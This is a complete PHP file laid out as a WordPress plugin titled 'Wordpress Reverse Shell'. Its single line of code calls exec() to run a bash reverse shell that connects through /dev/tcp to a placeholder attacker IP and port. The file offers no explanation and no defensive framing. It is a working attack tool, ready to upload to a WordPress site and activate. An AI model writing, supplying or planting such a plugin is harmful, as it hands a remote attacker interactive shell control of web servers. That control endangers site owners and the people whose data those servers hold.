<?php
/**
 * Plugin Name: Wordpress Reverse Shell
 * Author: azkrath
 */
exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<Port> 0>&1'")
?>